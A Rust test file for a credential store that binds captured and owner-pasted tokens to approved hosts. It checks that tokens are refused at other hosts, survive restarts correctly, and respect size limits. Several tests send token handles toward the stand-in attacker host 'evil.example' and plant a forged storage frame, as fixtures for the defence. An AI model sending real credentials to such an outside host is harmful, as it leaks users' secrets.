use super::*;

#[test]
fn a_captured_token_is_refused_at_a_listed_host_outside_its_set() {
    let rig = Rig::new(&token_reply());
    let secrets = rig.secrets();
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    let reply = requests
        .request("github", get("https://github.com/login/oauth/access_token"))
        .unwrap();
    let held = reply.captured[0].secret;
    let mut request = get("https://uploads.github.com/v1");
    request.bearer = Some(held);
    assert_eq!(
        requests.request("github", request),
        Err(StoreError::code("secret_handle_refused"))
    );
    let sends = rig.events().iter().filter(|event| *event == "send").count();
    assert_eq!(sends, 1);
}

#[test]
fn an_owner_paste_is_refused_at_a_host_the_owner_did_not_approve() {
    let rig = Rig::new(b"{}");
    let secrets = rig.secrets();
    let token = secrets.put_from_owner("github", "token").unwrap();
    rig.egress.events.lock().unwrap().clear();
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    let mut request = get("https://uploads.github.com/v1");
    request.bearer = Some(token);
    assert_eq!(
        requests.request("github", request),
        Err(StoreError::code("secret_handle_refused"))
    );
    let events = rig.events();
    assert!(!events.contains(&"get".to_owned()), "{events:?}");
    assert!(!events.contains(&"send".to_owned()), "{events:?}");
}

#[test]
fn send_rules_refuse_an_uncaptured_field_a_bad_host_list_and_a_reused_keep_as() {
    let invalid = Err(StoreError::code("net_capture_rules_invalid"));
    let rules = || {
        CaptureRules::new(&[("github", "github.com", &["access_token", "device_code"])]).unwrap()
    };
    let many: Vec<String> = (0..=SEND_HOSTS_MAX)
        .map(|index| format!("h{index}.example"))
        .collect();
    let many: Vec<&str> = many.iter().map(String::as_str).collect();
    for rows in [
        vec![("github", "refresh_token", &["api.github.com"][..], None)],
        vec![("github", "access_token", &[][..], None)],
        vec![(
            "github",
            "access_token",
            &["api.github.com", "api.github.com"][..],
            None,
        )],
        vec![("github", "access_token", &many[..], None)],
        vec![(
            "github",
            "access_token",
            &["api.github.com"][..],
            Some("Token"),
        )],
        vec![
            (
                "github",
                "access_token",
                &["api.github.com"][..],
                Some("token"),
            ),
            (
                "github",
                "device_code",
                &["api.github.com"][..],
                Some("token"),
            ),
        ],
        vec![
            ("github", "access_token", &["api.github.com"][..], None),
            ("github", "access_token", &["github.com"][..], None),
        ],
    ] {
        assert_eq!(rules().with_sends(&rows).map(|_| ()), invalid, "{rows:?}");
    }
    assert!(
        rules()
            .with_sends(&[(
                "github",
                "access_token",
                &many[..SEND_HOSTS_MAX],
                Some("token")
            )])
            .is_ok()
    );
}

/// The secrets module of one owner request whose paste the owner approved for
/// `api.github.com` only. Inputs: the store, the rig and the handle table. Output: it.
fn approved_for_api<'r>(
    store: &'r dyn Store,
    rig: &'r Rig,
    handles: &'r Mutex<Handles>,
) -> Secrets<'r> {
    Secrets::for_request(
        store,
        NAMESPACE,
        &rig.scopes,
        handles,
        Some(OwnerEntry {
            plugin: "github",
            hosts: vec!["api.github.com".to_owned()],
            value: SecretString::new(TOKEN.to_vec()).unwrap(),
        }),
    )
}

/// A GET to one URL keeping one captured field under a name. Inputs: the URL, the field
/// and the name. Output: the request.
fn kept(url: &str, field: &str, name: &str) -> Request {
    let mut request = get(url);
    request.capture = vec![capture(field, Some(name))];
    request
}

/// A GET to one URL carrying one handle as its bearer. Inputs: the URL and the handle.
/// Output: the request.
fn bearing(url: &str, handle: u64) -> Request {
    let mut request = get(url);
    request.bearer = Some(handle);
    request
}

/// A store that forwards to the rig's store until its puts are turned off.
struct PutsFail<'a> {
    inner: &'a FakeStore,
    off: std::sync::atomic::AtomicBool,
}

impl Store for PutsFail<'_> {
    fn put(
        &self,
        service: &str,
        account: &str,
        secret: &SecretString,
    ) -> Result<SecretRef, StoreError> {
        if self.off.load(std::sync::atomic::Ordering::SeqCst) {
            return Err(StoreError::code("credential_store_unavailable"));
        }
        self.inner.put(service, account, secret)
    }

    fn get(&self, found: &SecretRef) -> Result<SecretString, StoreError> {
        self.inner.get(found)
    }

    fn delete(&self, found: &SecretRef) -> Result<(), StoreError> {
        self.inner.delete(found)
    }

    fn git_credential_helper(
        &self,
        found: &SecretRef,
        username: &str,
    ) -> Result<String, StoreError> {
        self.inner.git_credential_helper(found, username)
    }
}

#[test]
fn an_owner_paste_under_a_name_a_capture_used_is_not_sent_to_the_capture_host() {
    let rig = Rig::new(&token_reply());
    let secrets = approved_for_api(&rig.store, &rig, &rig.handles);
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    let reply = requests
        .request(
            "github",
            kept("https://evil.example/v1", "access_token", "n"),
        )
        .unwrap();
    let pasted = secrets.put_from_owner("github", "n").unwrap();
    assert_eq!(pasted, reply.captured[0].secret);
    assert_eq!(
        requests.request("github", bearing("https://evil.example/v1", pasted)),
        Err(StoreError::code("secret_handle_refused"))
    );
    requests
        .request("github", bearing("https://api.github.com/user", pasted))
        .unwrap();
}

#[test]
fn a_new_capture_under_a_kept_name_drops_the_old_hosts() {
    let rig = Rig::new(&token_reply());
    let secrets = rig.secrets();
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    let first = requests
        .request(
            "github",
            kept("https://evil.example/v1", "access_token", "n"),
        )
        .unwrap()
        .captured[0]
        .secret;
    let second = requests
        .request(
            "github",
            kept(
                "https://github.com/login/oauth/access_token",
                "access_token",
                "n",
            ),
        )
        .unwrap()
        .captured[0]
        .secret;
    assert_eq!(first, second);
    assert_eq!(
        requests.request("github", bearing("https://evil.example/v1", second)),
        Err(StoreError::code("secret_handle_refused"))
    );
    requests
        .request("github", bearing("https://api.github.com/user", second))
        .unwrap();
}

#[test]
fn a_failed_put_keeps_the_old_hosts() {
    let rig = Rig::new(&token_reply());
    let store = PutsFail {
        inner: &rig.store,
        off: std::sync::atomic::AtomicBool::new(false),
    };
    let secrets = Secrets::for_request(&store, NAMESPACE, &rig.scopes, &rig.handles, None);
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    let held = requests
        .request(
            "github",
            kept(
                "https://github.com/login/oauth/access_token",
                "access_token",
                "n",
            ),
        )
        .unwrap()
        .captured[0]
        .secret;
    store.off.store(true, std::sync::atomic::Ordering::SeqCst);
    assert!(
        requests
            .request(
                "github",
                kept("https://evil.example/v1", "access_token", "n")
            )
            .is_err()
    );
    assert_eq!(
        requests.request("github", bearing("https://evil.example/v1", held)),
        Err(StoreError::code("secret_handle_refused"))
    );
    requests
        .request("github", bearing("https://api.github.com/user", held))
        .unwrap();
}

#[test]
fn a_name_kept_from_another_field_gets_only_its_own_hosts_after_a_restart() {
    let mut rig = Rig::new(&token_reply());
    rig.rules = CaptureRules::new(&[
        ("github", "evil.example", &["x"]),
        ("github", "github.com", &["access_token"]),
    ])
    .unwrap()
    .with_sends(&[("github", "x", &["evil.example"], Some("xname"))])
    .unwrap();
    let secrets = rig.secrets();
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    requests
        .request(
            "github",
            kept(
                "https://github.com/login/oauth/access_token",
                "access_token",
                "xname",
            ),
        )
        .unwrap();
    let later = Mutex::new(Handles::new());
    let next = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &later, None);
    let found = next.find("github", "xname").unwrap().unwrap();
    assert_eq!(
        next.value("github", found, "evil.example").map(|_| ()),
        Err(StoreError::code("secret_handle_refused"))
    );
    assert_eq!(
        next.value("github", found, "github.com").unwrap().expose(),
        CAPTURED
    );
}

#[test]
fn an_owner_paste_under_a_send_rule_name_gets_only_the_approved_hosts_after_a_restart() {
    let mut rig = Rig::new(b"{}");
    rig.rules = CaptureRules::new(&[("github", "evil.example", &["x"])])
        .unwrap()
        .with_sends(&[("github", "x", &["evil.example"], Some("xname"))])
        .unwrap();
    let secrets = approved_for_api(&rig.store, &rig, &rig.handles);
    secrets.put_from_owner("github", "xname").unwrap();
    let later = Mutex::new(Handles::new());
    let next = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &later, None);
    let found = next.find("github", "xname").unwrap().unwrap();
    assert_eq!(
        next.value("github", found, "evil.example").map(|_| ()),
        Err(StoreError::code("secret_handle_refused"))
    );
    assert_eq!(
        next.value("github", found, "api.github.com")
            .unwrap()
            .expose()
            .as_bytes(),
        TOKEN
    );
}

#[test]
fn a_found_value_gets_only_the_hosts_it_was_kept_with() {
    let mut rig = Rig::new(&token_reply());
    rig.rules = CaptureRules::new(&[
        ("github", "github.com", &["access_token"]),
        ("github", "evil.example", &["access_token"]),
    ])
    .unwrap()
    .with_sends(&[("github", "access_token", &["api.github.com"], Some("token"))])
    .unwrap();
    let secrets = rig.secrets();
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    requests
        .request(
            "github",
            kept(
                "https://github.com/login/oauth/access_token",
                "access_token",
                "token",
            ),
        )
        .unwrap();
    let later = Mutex::new(Handles::new());
    let next = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &later, None);
    let found = next.find("github", "token").unwrap().unwrap();
    assert_eq!(
        next.value("github", found, "evil.example").map(|_| ()),
        Err(StoreError::code("secret_handle_refused"))
    );
    for host in ["github.com", "api.github.com"] {
        assert_eq!(
            next.value("github", found, host).unwrap().expose(),
            CAPTURED,
            "{host}"
        );
    }
}

#[test]
fn an_item_stored_with_no_frame_is_refused_at_every_host() {
    let rig = Rig::new(b"{}");
    let old = reference(&format!("{NAMESPACE}.github"), "token").unwrap();
    rig.store
        .items
        .lock()
        .unwrap()
        .insert(old, CAPTURED.as_bytes().to_vec());
    let secrets = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &rig.handles, None);
    let found = secrets.find("github", "token").unwrap().unwrap();
    for host in ["github.com", "api.github.com", "evil.example"] {
        assert_eq!(
            secrets.value("github", found, host).map(|_| ()),
            Err(StoreError::code("secret_handle_refused")),
            "{host}"
        );
    }
    assert_eq!(secrets.forget("github", found), Ok(()));
}

#[test]
fn a_host_header_over_its_bound_is_refused_before_the_write() {
    let rig = Rig::new(b"{}");
    let host = "h".repeat(250);
    let hosts: Vec<String> = (0..HOSTS_HEADER_BYTES_MAX / 250 + 1)
        .map(|index| format!("{index}{host}"))
        .collect();
    let secrets = Secrets::for_request(
        &rig.store,
        NAMESPACE,
        &rig.scopes,
        &rig.handles,
        Some(OwnerEntry {
            plugin: "github",
            hosts,
            value: SecretString::new(TOKEN.to_vec()).unwrap(),
        }),
    );
    assert_eq!(
        secrets.put_from_owner("github", "token"),
        Err(StoreError::code("secret_hosts_invalid"))
    );
    assert!(rig.store.items.lock().unwrap().is_empty());
}

#[test]
fn a_legacy_item_that_looks_framed_binds_no_host() {
    let rig = Rig::new(b"{}");
    let old = reference(&format!("{NAMESPACE}.github"), "token").unwrap();
    rig.store
        .items
        .lock()
        .unwrap()
        .insert(old, b"ca-hosts1|evil.example|x".to_vec());
    let secrets = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &rig.handles, None);
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    let found = secrets.find("github", "token").unwrap().unwrap();
    assert_eq!(
        requests.request("github", bearing("https://evil.example/v1", found)),
        Err(StoreError::code("secret_handle_refused"))
    );
}

#[test]
fn a_captured_value_over_the_secret_bound_is_refused_without_a_write() {
    let long = "a".repeat(SECRET_BYTES_MAX + 1);
    let rig = Rig::new(format!(r#"{{"access_token":"{long}"}}"#).as_bytes());
    let secrets = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &rig.handles, None);
    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
    assert_eq!(
        requests
            .request(
                "github",
                kept(
                    "https://github.com/login/oauth/access_token",
                    "access_token",
                    "n",
                ),
            )
            .map(|_| ()),
        Err(StoreError::code("credential_secret_invalid"))
    );
    assert!(rig.store.items.lock().unwrap().is_empty());
}

#[test]
fn an_owner_value_over_the_secret_bound_keeps_the_old_item() {
    let rig = Rig::new(b"{}");
    let secrets = approved_for_api(&rig.store, &rig, &rig.handles);
    secrets.put_from_owner("github", "token").unwrap();
    let before = rig.store.items.lock().unwrap().clone();
    let handles = Mutex::new(Handles::new());
    let long = Secrets::for_request(
        &rig.store,
        NAMESPACE,
        &rig.scopes,
        &handles,
        Some(OwnerEntry {
            plugin: "github",
            hosts: vec!["evil.example".to_owned()],
            value: SecretString::bearer(vec![b'a'; SECRET_BYTES_MAX + 1]).unwrap(),
        }),
    );
    assert_eq!(
        long.put_from_owner("github", "token"),
        Err(StoreError::code("credential_secret_invalid"))
    );
    assert_eq!(*rig.store.items.lock().unwrap(), before);
}
